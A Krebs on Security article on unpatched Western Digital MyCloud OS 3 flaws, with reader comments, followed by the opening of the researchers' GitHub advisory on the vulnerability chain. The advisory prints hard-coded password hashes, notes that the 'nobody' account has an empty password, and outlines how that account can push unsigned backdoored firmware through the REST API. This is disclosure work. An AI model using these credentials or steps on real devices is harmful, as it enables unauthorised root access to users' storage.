=== Content from krebsonsecurity.com_c4f17a69_20250108_131520.html ===


Advertisement[![](/b-nyu/15.png)](https://cybersecurity-strategy-masters.nyu.edu/)
Advertisement[![](/b-knowbe4/23.jpg)](https://www.knowbe4.com/phisher-ai-osterman-6?utm_source=Krebs&utm_medium=display&utm_campaign=SATBrandAwareness&utm_content=AIEmail)

[![Krebs on Security](https://krebsonsecurity.com/wp-content/uploads/2021/03/kos-27-03-2021.jpg)](https://krebsonsecurity.com/ "Krebs on Security")

[Skip to content](#content "Skip to content")

* [Home](https://krebsonsecurity.com/)
* [About the Author](https://krebsonsecurity.com/about/)
* [Advertising/Speaking](https://krebsonsecurity.com/cpm/)

# Another 0-Day Looms for Many Western Digital Users

July 2, 2021

[24 Comments](https://krebsonsecurity.com/2021/07/another-0-day-looms-for-many-western-digital-users/#comments)

![](https://krebsonsecurity.com/wp-content/uploads/2021/07/mycloud.png)

Countless **Western Digital** customers saw their **MyBook Live** network storage drives remotely wiped in the past month thanks to a bug in a product line the company stopped supporting in 2015, as well as a previously unknown zero-day flaw. But there is a similarly serious zero-day flaw present in a much broader range of newer Western Digital **MyCloud** network storage devices that will remain unfixed for many customers who can’t or won’t upgrade to the latest operating system.

At issue is a remote code execution flaw residing in all Western Digital network attached storage (NAS) devices running **MyCloud** **OS 3**, an operating system the company only recently stopped supporting.

Researchers [**Radek Domanski** and **Pedro Ribeiro**](https://www.flashback.sh/) originally planned to present their findings at the [Pwn2Own hacking competition in Tokyo](https://www.thezdi.com/blog/2020/7/28/announcing-pwn2own-tokyo-2020-live-from-toronto) last year. But just days before the event Western Digital released **MyCloud OS 5**, which eliminated the bug they found. That update effectively nullified their chances at competing in Pwn2Own, which requires exploits to work against the latest firmware or software supported by the targeted device.

Nevertheless, in February 2021, the duo published [this detailed YouTube video](https://www.youtube.com/watch?v=vsg9YgvGBec), which documents how they discovered a chain of weaknesses that allows an attacker to remotely update a vulnerable device’s firmware with a malicious backdoor — using a low-privileged user account that has a blank password.

The researchers said Western Digital never responded to their reports. In a statement provided to KrebsOnSecurity, Western Digital said it received their report after Pwn2Own Tokyo 2020, but that at the time the vulnerability they reported had already been fixed by the release of My Cloud OS 5.

“The communication that came our way confirmed the research team involved planned to release details of the vulnerability and asked us to contact them with any questions,” Western Digital said. “We didn’t have any questions so we didn’t respond. Since then, we have updated our process and respond to every report in order to avoid any miscommunication like this again. We take reports from the security research community very seriously and conduct investigations as soon as we receive them.”

Western Digital ignored questions about whether the flaw found by Domanski and Ribeiro was ever addressed in OS 3. A statement published on its support site March 12, 2021 says the company will [no longer provide further security updates to the MyCloud OS 3 firmware](https://www.westerndigital.com/support/productsecurity/wdc-21004-recommended-upgrade-to-mycloud-os-5).

“We strongly encourage moving to the My Cloud OS5 firmware,” the statement reads. “If your device is not eligible for upgrade to My Cloud OS 5, we recommend that you upgrade to one of our other My Cloud offerings that support My Cloud OS 5. More information can be found [here](https://shop.westerndigital.com/support/software/my-cloud-os).” A list of MyCloud devices that can support OS 5 is [here](http://My Cloud EX2 Ultra My Cloud EX4100 My Cloud PR2100 My Cloud PR4100 My Cloud DL2100 My Cloud DL4100 My Cloud EX2100 My Cloud (Firmware 2.xx.xxx) My Cloud Mirror Gen 2).

But according to Domanski, OS 5 is a complete rewrite of Western Digital’s core operating system, and as a result some of the more popular features and functionality built into OS3 are missing.

“It broke a lot of functionality,” Domanski said of OS 5. “So some users might not decide to migrate to OS 5.”

In recognition of this, the researchers have [developed and released their own patch](https://www.youtube.com/redirect?event=video_description&redir_token=QUFFLUhqa3VQYnhhbG9LMDRFdlRuX1Y3aVFnTXVEU2swQXxBQ3Jtc0ttRVl0SExFQ29oRFkyNzlvRXpWdXJ5ekxTOGdoS2tpck1nQ0tpYnNyMGs3WVdxQkNtRTl0ZnJaUW9RNlFMX08xT0JOdFJHMXhYUjdyelZNX2pPbzBhaEpSdWVITUotWVkzd2ZPNUFubFJWd09tbGNLOA&q=https%3A%2F%2Fgithub.com%2Fpedrib%2FPoC%2Fblob%2Fmaster%2Fadvisories%2FPwn2Own%2FTokyo_2020%2Fweekend_destroyer%2Fweekend_destroyer_patch.sh) that fixes the vulnerabilities they found in OS 3 (the patch needs to be reapplied each time the device is rebooted). Western Digital said it is aware of third parties offering security patches for My Cloud OS 3.

“We have not evaluated any such patches and we are unable to provide any support for such patches,” the company stated.

![](https://krebsonsecurity.com/wp-content/uploads/2021/07/4100.png)

A snippet from the video showing the researchers uploading their malicious firmware via a remote zero-day flaw in MyCloud OS 3.

Domanski said MyCloud users on OS 3 can virtually eliminate the threat from this attack by simply ensuring that the devices are not set up to be reachable remotely over the Internet. MyCloud devices make it super easy for customers to access their data remotely, but doing so also exposes them to attacks like last month’s that led to the mass-wipe of MyBook Live devices.

“Luckily for many users they don’t expose the interface to the Internet,” he said. “But looking at the number of posts on Western Digital’s support page related to OS3, I can assume the userbase is still considerable. It almost feels like Western Digital without any notice jumped to OS5, leaving all the users without support.”

[Dan Goodin](https://twitter.com/dangoodin001) at *Ars Technica* has [a fascinating deep dive](https://arstechnica.com/gadgets/2021/06/hackers-exploited-0-day-not-2018-bug-to-mass-wipe-my-book-live-devices/) on the other zero-day flaw that led to the mass attack last month on MyBook Live devices that Western Digital stopped supporting in 2015. In response to Goodin’s report, Western Digital acknowledged that the flaw was enabled by a Western Digital developer who removed code that required a valid user password before allowing factory resets to proceed.

Facing a backlash of angry customers, Western Digital also [pledged](https://www.westerndigital.com/support/productsecurity/wdc-21008-recommended-security-measures-wd-mybooklive-wd-mybookliveduo) to provide data recovery services to affected customers starting this month. “MyBook Live customers will also be eligible for a trade-in program so they can upgrade to MyCloud devices,” Goodin wrote. “A spokeswoman said the data recovery service will be free of charge.”

If attackers get around to exploiting this OS 3 bug, Western Digital might soon be paying for data recovery services and trade-ins for a whole lot more customers.

*This entry was posted on Friday 2nd of July 2021 12:05 PM*

[Latest Warnings](https://krebsonsecurity.com/category/latest-warnings/) [The Coming Storm](https://krebsonsecurity.com/category/comingstorm/) [Time to Patch](https://krebsonsecurity.com/category/patches/)
[Ars Technica](https://krebsonsecurity.com/tag/ars-technica/) [Dan Goodin](https://krebsonsecurity.com/tag/dan-goodin/) [MyBook Live](https://krebsonsecurity.com/tag/mybook-live/) [MyCloud OS 3](https://krebsonsecurity.com/tag/mycloud-os-3/) [MyCloud OS 5](https://krebsonsecurity.com/tag/mycloud-os-5/) [Pedro Ribeiro](https://krebsonsecurity.com/tag/pedro-ribeiro/) [Pwn2Own](https://krebsonsecurity.com/tag/pwn2own/) [Radek Domanski](https://krebsonsecurity.com/tag/radek-domanski/) [Western Digital](https://krebsonsecurity.com/tag/western-digital/)

Post navigation
[← Intuit to Share Payroll Data from 1.4M Small Businesses With Equifax](https://krebsonsecurity.com/2021/07/intuit-to-share-payroll-data-from-1-4m-small-businesses-with-equifax/)
[Microsoft Issues Emergency Patch for Windows Flaw →](https://krebsonsecurity.com/2021/07/microsoft-issues-emergency-patch-for-windows-flaw/)

## 24 thoughts on “Another 0-Day Looms for Many Western Digital Users”

1. CGC [July 2, 2021](https://krebsonsecurity.com/2021/07/another-0-day-looms-for-many-western-digital-users/#comment-536071)

   This affects only the WD MyBook product line? If you have a WD MyPassport (ultra or other) it’s not affected, because that product is not set up to be reachable remotely over the Internet, correct?

   1. Mark [July 2, 2021](https://krebsonsecurity.com/2021/07/another-0-day-looms-for-many-western-digital-users/#comment-536078)

      This only affects WD devices that can connect directly to a network (i.e. NAS devices). USB-connected devices like the ones you mentioned are not affected by these bugs.
   3. Dingus [July 2, 2021](https://krebsonsecurity.com/2021/07/another-0-day-looms-for-many-western-digital-users/#comment-536079)

      Correct. My book live and my book cloud.
3. Anthony [July 3, 2021](https://krebsonsecurity.com/2021/07/another-0-day-looms-for-many-western-digital-users/#comment-536103)

   Honestly.. Western Digital has a track record of atrocious software on their network attached devices. I remember getting a box of old tech with a WD NAS in it, and after a quick google, I turfed it into ewaste (after pulling out the drives) as it was a steaming pile of remotely compromisable cruft.

   They clearly want to have some network attached solutions to appeal to folks who want more than just device attached storage, but their heart clearly isn’t in it… just increasing the breadth of the product portfolio.
5. Tom [July 3, 2021](https://krebsonsecurity.com/2021/07/another-0-day-looms-for-many-western-digital-users/#comment-536118)

   The hyperlink for the list of MyCloud devices that support OS5 does not work.

   1. RSG [July 3, 2021](https://krebsonsecurity.com/2021/07/another-0-day-looms-for-many-western-digital-users/#comment-536138)

      Yes the link doesn’t work. We would really like this link to be corrected and published.
   3. William Kemmler [July 5, 2021](https://krebsonsecurity.com/2021/07/another-0-day-looms-for-many-western-digital-users/#comment-536216)

      I assume this is a list of the devices that are eligible for upgrade will support WD OS5:

      <https://www.westerndigital.com/support/productsecurity/wdc-21004-recommended-upgrade-to-mycloud-os-5>
7. Alez Omi Opi [July 3, 2021](https://krebsonsecurity.com/2021/07/another-0-day-looms-for-many-western-digital-users/#comment-536122)

   Anybody that nowadays makes all their backup or whatever data accessible from the Internet simply through a half baked bundled OEM application is bound to be looking for trouble just like this. When will people finally realize that today’s Internet is the “Danger Zone”. For sure it ain’t Kansas anymore…

   1. The Tech wannabe [July 4, 2021](https://krebsonsecurity.com/2021/07/another-0-day-looms-for-many-western-digital-users/#comment-536184)

      How many people know or even care if they do know?

      1. mealy [July 6, 2021](https://krebsonsecurity.com/2021/07/another-0-day-looms-for-many-western-digital-users/#comment-536269)

         I think the question we need to ask is do we expect all users to STOP USING the HW when the product EOL hits after a mere 4(!) years? That’s the proposition described, the security support ends with feature support. That should be decoupled IMO. Not all devices need to run the new 5 version, but the old ones should still have a rudimentary patch (it wouldn’t really cost that much, but it has a cost) to address the big flopping 0 days as discovered. If it’s something that can’t be overcome by a minor update maybe they’re off the hook, but this isn’t that. This is fixable. And I acknowledge they can’t support products forever – that’s not what I’m describing, just a priority shift towards a base-level secure state and separation of responsibility vis a vis major holes that are easily filled in 4-5 year old products, rather than artificially “deciding” that the only way to address it is landfill. Yes I’m calling for a higher legal standard than extant.
9. Cog [July 3, 2021](https://krebsonsecurity.com/2021/07/another-0-day-looms-for-many-western-digital-users/#comment-536133)

   I ordered 2 Mybook drives in January that were DOA and they didn’t have any stock left to replace them. There is nothing to worry about with standard usb wd drives? I have 4 of the mypassport ones.
11. Matt A [July 3, 2021](https://krebsonsecurity.com/2021/07/another-0-day-looms-for-many-western-digital-users/#comment-536142)

    I find it interesting that WD will help with data recovery but ONLY if you buy (with trade-in) a new device from them. Translation: “We’re sorry you lost your precious family photos. We’ll be happy to get them back for you unless you decide you don’t want to (or are financially unable to) keep using our products.

    1. William Kemmler [July 5, 2021](https://krebsonsecurity.com/2021/07/another-0-day-looms-for-many-western-digital-users/#comment-536217)

       And what’s wrong with that. WD will help with data recovery on the understanding that you won’t just stick the recovered data right back onto the vulnerable devices and go through the same thing again. Because like it or not, there would be some users stupid enough to do just that. Translation: We’ll help you recover your data but only on the understanding that you will not be using your unsupported, obsolete WD NAS system to store that data so that you don’t (and we don’t) have to go through this again.
    3. William Kemmler [July 5, 2021](https://krebsonsecurity.com/2021/07/another-0-day-looms-for-many-western-digital-users/#comment-536220)

       Upon further investigation I cannot find where Western Digital is requiring people to buy a new WD NAS device in order to qualify for data recovery services. All I can find is the following statement(s):

       “Data Recovery and Product Trade-In Programs: To help customers who have lost data as a result of these attacks, Western Digital will provide data recovery services, which will be available beginning in July. My Book Live customers will also be offered a trade-in program to upgrade to a supported My Cloud device.”

       And the following:

       Neither of which state that in order to receive the data recovery assistance once must trade in or buy a new WD NAS device. So what is your exact source for your claim that a trade-in or purchase of a new WD NAS device is required.

       Source:

       <https://www.westerndigital.com/support/productsecurity/wdc-21008-recommended-security-measures-wd-mybooklive-wd-mybookliveduo>
    5. Douglas McGinnis [July 7, 2021](https://krebsonsecurity.com/2021/07/another-0-day-looms-for-many-western-digital-users/#comment-536318)

       Right and their answer is to give you 40% off a new product. 40%, really??? WTF! How about 80% off????
13. Wayne [July 5, 2021](https://krebsonsecurity.com/2021/07/another-0-day-looms-for-many-western-digital-users/#comment-536230)

    I mean, I get the discontent…But could you really even label this as incompetence? With “Nation States” that have enumerable resources dedicated to stealing any/all data…Should any company be held responsible for an exploit on out of warranty equipment especially if it’s 5 years out? If so, what is the time-line for accountability? Millennials always need someone to blame when something goes wrong…Maybe Millennials are what’s wrong…

    1. Ok Boomer [July 6, 2021](https://krebsonsecurity.com/2021/07/another-0-day-looms-for-many-western-digital-users/#comment-536261)

       Millennials would only set up these devices for their Boomer parents who don’t know or care to keep them updated.

       The “set it and forget it” mentality of the older generation is simply incompatible with modern threats.

       1. Mike [July 6, 2021](https://krebsonsecurity.com/2021/07/another-0-day-looms-for-many-western-digital-users/#comment-536267)

          I know more millennials with a “set it and forget it” mentality than “Boomer parents” with that mentality. Remember, it was boomers and GenXers who created the thing. Most of us who have been around since the days when 1200 baud modems were “state of the art” know better.

          It is the generation that was raised on iPhones and iThis and iThats that expect things to “just work” without putting in any effort that have led to most of this. All of that “just works” convenience has \*ALWAYS\* come at a security cost. But people have come to expect that computers will update themselves (because PCs and Macs do that. Even when you explicitly tell them not to; if you block their ability to do so, PCs will start complaining that you are running “unlicensed software”. It really goes hand in hand with the mentality that just accepts that we don’t own the software on our computing devices.

          In a world where we don’t own the software on our computing devices, and in particular, we don’t own the software on the computing device (it’s no accident that when you install or upgrade your software, you are presented with a \*\*LICENSING\*\* agreement…), then yeah, I’d say it’s the publisher’s responsibility to maintain their software. If you own a car, you don’t get to stop taking care of the brakes, and still expect it to run. So sure, if I \*own\* the software, then I should be expected to maintain it, but I am explicitly told I \*DO NOT\* own the software. So which is it? Do I own the software, or do I license the software?

          1. Right Gramps [July 6, 2021](https://krebsonsecurity.com/2021/07/another-0-day-looms-for-many-western-digital-users/#comment-536271)

             I doubt it. The “set it and forget it” mentality comes from household appliances that boomers invented for themselves.

             Now, they treat computers like appliances. They want all the cloud benefits, but don’t understand that the cloud isn’t magic.

             “But people have come to expect that computers will update themselves”

             Um… no. We understand when devices prompt to be updated. We don’t call our kids every time a popup says to confirm an update like you guys.

             What are you talking about? What’s your definition of “owning”. Rights to the intellectual property? Being allowed to distribute software? Or just buying the rights to operate a single instance of the software? If you write software, and sell it… do you think whoever buys a license to use it, should be entitled to indefinite support?

             The car analogy is better one. When a car goes out of warranty… the owner still has to periodically check for recall notices.
    3. Mike [July 6, 2021](https://krebsonsecurity.com/2021/07/another-0-day-looms-for-many-western-digital-users/#comment-536268)

       I think when WD published software that deliberately disabled even basic protection like a password check… yeah, they’re responsible for that. Obviously, that update was published before they went out of warranty. They should at least be required to fix \*that\* bit of stupidity.

       If the update that disabled password authentication for admin tasks happened to be published in the days leading up to the product going out of warranty… that’s \*at least\* borderline criminal. It would likely be \*really\* hard to prove that it was intentional, but that the sort of thing that even if it wasn’t intentional could destroy a company.

       Note that I’m not saying that particular things \*was\* published just before they went out of warranty; I have no way to know when that entered the source code. One could probably look at the modification date in the firmware and make an educated guess, but I don’t have one of these devices (and if I did, I’d have replaced the factory OS as soon as I could figure out how. I don’t even run stock firmware on my WiFi routers if I can help it (and I always purchase units that I can reflash…) )
15. Steve Midgley [July 6, 2021](https://krebsonsecurity.com/2021/07/another-0-day-looms-for-many-western-digital-users/#comment-536259)

    Given that physical storage companies think of firmware as something that can be deprecated and no longer supported, it seems like we should be relying on the firmware for as little as possible (performant I/O directly through a standard interface). Build the NAS or other solution via software on top, with those solutions presumably have much longer support timelines, and better migration paths when they reach deprecation status?
17. [MyLowesLife](https://www.myloweslife.biz/) [July 14, 2021](https://krebsonsecurity.com/2021/07/another-0-day-looms-for-many-western-digital-users/#comment-536752)

    Thanks for sharing such great information, the post you published have some great information which is quite beneficial for me.
19. jason [July 18, 2021](https://krebsonsecurity.com/2021/07/another-0-day-looms-for-many-western-digital-users/#comment-536981)

    I updated my firmware to 2.41.116 but since I don’t agree with the TOS to use the new browser interface I can’t log in to jump to v5.

    I disabled all apps and access to the cloud on original install and put a block rule from my LAN IP in my router so I don’t feel exposed.
21. Ryan [July 27, 2021](https://krebsonsecurity.com/2021/07/another-0-day-looms-for-many-western-digital-users/#comment-537502)

    I am curious I don’t really see anyone talking about the possibility of shucking these drives and putting them in a new USB 3 enclosure. I am assuming that would mitigate the security vulnerability.

Comments are closed.

Advertisement[![](/b-nyu/17.png)](https://cybersecurity-strategy-masters.nyu.edu/)

Advertisement

Mailing List

[Subscribe here](/subscribe/)

Search KrebsOnSecurity

Search for:

Recent Posts

* [A Day in the Life of a Prolific Voice Phishing Crew](https://krebsonsecurity.com/2025/01/a-day-in-the-life-of-a-prolific-voice-phishing-crew/)
* [U.S. Army Soldier Arrested in AT&T, Verizon Extortions](https://krebsonsecurity.com/2024/12/u-s-army-soldier-arrested-in-att-verizon-extortions/)
* [Happy 15th Anniversary, KrebsOnSecurity!](https://krebsonsecurity.com/2024/12/happy-15th-anniversary-krebsonsecurity/)
* [Web Hacking Service ‘Araneida’ Tied to Turkish IT Firm](https://krebsonsecurity.com/2024/12/web-hacking-service-araneida-tied-to-turkish-it-firm/)
* [How to Lose a Fortune with Just One Bad Click](https://krebsonsecurity.com/2024/12/how-to-lose-a-fortune-with-just-one-bad-click/)

Story Categories

* [A Little Sunshine](https://krebsonsecurity.com/category/sunshine/)
* [All About Skimmers](https://krebsonsecurity.com/category/all-about-skimmers/)
* [Ashley Madison breach](https://krebsonsecurity.com/category/ashley-madison-breach/)
* [Breadcrumbs](https://krebsonsecurity.com/category/breadcrumbs/)
* [Data Breaches](https://krebsonsecurity.com/category/data-breaches/)
* [DDoS-for-Hire](https://krebsonsecurity.com/category/ddos-for-hire/)
* [Employment Fraud](https://krebsonsecurity.com/category/employment-fraud/)
* [How to Break Into Security](https://krebsonsecurity.com/category/how-to-break-into-security/)
* [Internet of Things (IoT)](https://krebsonsecurity.com/category/internet-of-things-iot/)
* [Latest Warnings](https://krebsonsecurity.com/category/latest-warnings/)
* [Ne'er-Do-Well News](https://krebsonsecurity.com/category/neer-do-well-news/)
* [Other](https://krebsonsecurity.com/category/other/)
* [Pharma Wars](https://krebsonsecurity.com/category/pharma-wars/)
* [Ransomware](https://krebsonsecurity.com/category/ransomware/)
* [Russia's War on Ukraine](https://krebsonsecurity.com/category/russias-war-on-ukraine/)
* [Security Tools](https://krebsonsecurity.com/category/security-tools/)
* [SIM Swapping](https://krebsonsecurity.com/category/sim-swapping/)
* [Spam Nation](https://krebsonsecurity.com/category/spam-nation/)
* [Target: Small Businesses](https://krebsonsecurity.com/category/smallbizvictims/)
* [Tax Refund Fraud](https://krebsonsecurity.com/category/tax-refund-fraud/)
* [The Coming Storm](https://krebsonsecurity.com/category/comingstorm/)
* [Time to Patch](https://krebsonsecurity.com/category/patches/)
* [Web Fraud 2.0](https://krebsonsecurity.com/category/web-fraud-2-0/)

Why So Many Top Hackers Hail from Russia

[![](https://krebsonsecurity.com/wp-content/uploads/2017/06/computered-580x389.png)](https://krebsonsecurity.com/2017/06/why-so-many-top-hackers-hail-from-russia/)

© Krebs on Security - [Mastodon](https://infosec.exchange/%40briankrebs)



=== Content from github.com_097a5a0e_20250108_131519.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fpedrib%2FPoC%2Fblob%2Fmaster%2Fadvisories%2FPwn2Own%2FTokyo_2020%2Fweekend_destroyer%2Fweekend_destroyer.md)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fpedrib%2FPoC%2Fblob%2Fmaster%2Fadvisories%2FPwn2Own%2FTokyo_2020%2Fweekend_destroyer%2Fweekend_destroyer.md)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&source=header-repo&source_repo=pedrib%2FPoC)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[pedrib](/pedrib)
/
**[PoC](/pedrib/PoC)**
Public

* [Notifications](/login?return_to=%2Fpedrib%2FPoC) You must be signed in to change notification settings
* [Fork
  168](/login?return_to=%2Fpedrib%2FPoC)
* [Star
   830](/login?return_to=%2Fpedrib%2FPoC)

* [Code](/pedrib/PoC)
* [Issues
  0](/pedrib/PoC/issues)
* [Pull requests
  0](/pedrib/PoC/pulls)
* [Actions](/pedrib/PoC/actions)
* [Projects
  0](/pedrib/PoC/projects)
* [Wiki](/pedrib/PoC/wiki)
* [Security](/pedrib/PoC/security)
* [Insights](/pedrib/PoC/pulse)

Additional navigation options

* [Code](/pedrib/PoC)
* [Issues](/pedrib/PoC/issues)
* [Pull requests](/pedrib/PoC/pulls)
* [Actions](/pedrib/PoC/actions)
* [Projects](/pedrib/PoC/projects)
* [Wiki](/pedrib/PoC/wiki)
* [Security](/pedrib/PoC/security)
* [Insights](/pedrib/PoC/pulse)

## Files

 master
## Breadcrumbs

1. [PoC](/pedrib/PoC/tree/master)
2. /[advisories](/pedrib/PoC/tree/master/advisories)
3. /[Pwn2Own](/pedrib/PoC/tree/master/advisories/Pwn2Own)
4. /[Tokyo\_2020](/pedrib/PoC/tree/master/advisories/Pwn2Own/Tokyo_2020)
5. /[weekend\_destroyer](/pedrib/PoC/tree/master/advisories/Pwn2Own/Tokyo_2020/weekend_destroyer)
/
# weekend\_destroyer.md

 Blame  Blame
## Latest commit

## History

[History](/pedrib/PoC/commits/master/advisories/Pwn2Own/Tokyo_2020/weekend_destroyer/weekend_destroyer.md)365 lines (269 loc) · 16.4 KB master
## Breadcrumbs

1. [PoC](/pedrib/PoC/tree/master)
2. /[advisories](/pedrib/PoC/tree/master/advisories)
3. /[Pwn2Own](/pedrib/PoC/tree/master/advisories/Pwn2Own)
4. /[Tokyo\_2020](/pedrib/PoC/tree/master/advisories/Pwn2Own/Tokyo_2020)
5. /[weekend\_destroyer](/pedrib/PoC/tree/master/advisories/Pwn2Own/Tokyo_2020/weekend_destroyer)
/
# weekend\_destroyer.md

Top
## File metadata and controls

* Preview
* Code
* Blame

365 lines (269 loc) · 16.4 KB[Raw](https://github.com/pedrib/PoC/raw/refs/heads/master/advisories/Pwn2Own/Tokyo_2020/weekend_destroyer/weekend_destroyer.md)
# weekend\_destroyer

---

# Summary

This document describes a chain of vulnerabilities that were found by **Pedro Ribeiro ([@pedrib1337](https://twitter.com/pedrib1337) | pedrib@gmail.com)** and **Radek Domanski ([@RabbitPro](https://twitter.com/RabbitPro) | radek.domanski@gmail.com)** and *intended to be presented* at [Zero Day Initiative](https://www.zerodayinitiative.com/) **Pwn2Own Tokyo 2020** competition in November 2020.

The vulnerabilities described in this document are present in the network attached storage (NAS) device **Western Digital My Cloud Pro Series PR4100** ([PR4100](https://shop.westerndigital.com/products/network-attached-storage/wd-my-cloud-pro-series-pr4100)), on firmware versions up to and including 2.40.157.

The default configuration is exploitable by an unauthenticated attacker, who can achieve remote code execution as root on the PR4100. The exploit creates a persistent backdoor, which gives the attacker full control of the device even after a reboot.

The exploit chains three vulnerabilities to achieve code execution:

* [CVE-2021-36224](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-36224): Hard-coded User Credentials
* [CVE-2021-36225](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-36224): Firmware Upgrade Can be Initiated by Low Privilege User
* [CVE-2021-36226](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-36224): No Cryptographic Verification of Firmware Upgrades

All code snippets in this advisory were obtained from files in firmware version 2.40.155.

## Western Digital, the Party Poopers

Less than one week before the Pwn2Own competiton, WD released a entirely new operating system, OS version 5, which replaced OS version 3. This was certainly not a coincidence, as WD was listed as one of the ZDI "partners" for Pwn2Own.

The new operating system is completely different, and it killed off the vulnerabilities listed below, as well as many other vulnerabilities discovered by other competitors.
While fixing or killing vulnerabilities is a good thing, we believe that it was WD's intention to trip up all Pwn2Own competitors, and then claim "victory" by saying their product is secure and was not hacked at the competition.

While we did not have time to find new vulnerabilities in OS 5, other competitors did, and WD's evil plan was foiled - they were still humbled by a series of vulnerabilities disclosed at the competition.

However, it seems that OS 5 was released in such a rush that it didn't even implement some basic features expected by users of OS 3, and some device models running OS 3 were not supported at all.

We highly recommend that you watch [our video that explains all of these vulnerabilities](https://www.youtube.com/watch?v=vsg9YgvGBec) in detail, as well as the drama surrounding it, which is also detailed in a [Krebs On Security article](https://krebsonsecurity.com/2021/07/another-0-day-looms-for-many-western-digital-users/).

[![Exploiting (and Patching) a Zero Day RCE Vulnerability in a Western Digital NAS](https://camo.githubusercontent.com/a93eb635ecf571a3e6934d793e114d9e3e7b5c9e36629080dcee221bbf5fe346/68747470733a2f2f696d672e796f75747562652e636f6d2f76692f76736739596776474265632f302e6a7067)](https://www.youtube.com/watch?v=vsg9YgvGBec)

# Vulnerability Details

## Background on PR4100 HTTP services

The PR4100 device exposes a number of services to the local network. There is an Apache *httpd* server running on ports 80 and 443, which hosts the main administrative web application and a REST API.

The REST API is the main component that we have abused to exploit the device.
It is accessible at */api/2.1/rest/\** and it exposes various API endpoints that are used for a variety of tasks, from managing data stored in the device, to accessing it, managing system properties of the device, etc. Each endpoint has different permissions such as the ones shown below:

* NO\_AUTH
* USER\_AUTH
* ADMIN\_AUTH\_LAN

The permissions are self explanatory, but the first one requires no authentication to access, the second one only authenticated users can access, while the last one is only accessible to administrative users. Each endpoint can be configured to respond to different HTTP verbs such as GET, POST, etc, and access is controlled by tagging it with one or more of the permissions shown above.

## Vulnerability 1: Hard-coded User Credentials

The first vulnerability we have identified in PR4100 was the usage of various hard-coded credentials for a number of users in the system. The contents of */etc/shadow* are shown below:

```
root:$1$$HTjCpuPOAkaXeDD7e2p.5.:14746:0:99999:7:::
sshd:$1$$HTjCpuPOAkaXeDD7e2p.5.:14746:0:99999:7:::
admin:$1$$CoERg7ynjYLsj2j4glJ34.:15882:0:99999:7:::
nobody:$1$$qRPK7m23GJusamGpoGLby/:15882:0:99999:7:::
squeezecenter:$1$$o7vIitnZu4MHlaR5S90M/1:15460:0:99999:7:::

```

The *root*, *sshd* and *admin* passwords are set when the device is configured for the first time, and therefore unique to each device. However, users *nobody* and *squeezecenter* have fixed passwords, which are the same across multiple firmware versions. These passwords are embedded in the firmware updates, therefore they are the same in every PR4100 device.

These passwords are trivial to crack using wordlists and rainbow tables due to the usage of a weak hashing algorithm (*md5crypt*) with no salting. After we ran these through a password cracker, the *nobody* password was found in seconds - it is actually an empty password ("").

We briefly attempted to crack the *squeezecenter* password but were unable to with a simple dictionary. We believe this password is easily crackable by bruteforcing with a GPU, AWS or other cloud password cracking mechanism. However this was unnecessary, since we could exploit the device with the *nobody* user, so it was not attempted.

## Vulnerability #2: Firmware Upgrade Can be Initiated by Low Privilege User

While the *nobody* user could not login via the web interface, it could perform *USER\_AUTH* (authenticated user) actions in the REST API. After auditing the REST API code for interesting calls, we found one that triggers a firmware update:

```
    /**
     * \par Description:
     * Causes NAS to update to firmware in file that is copied to the device.
     *
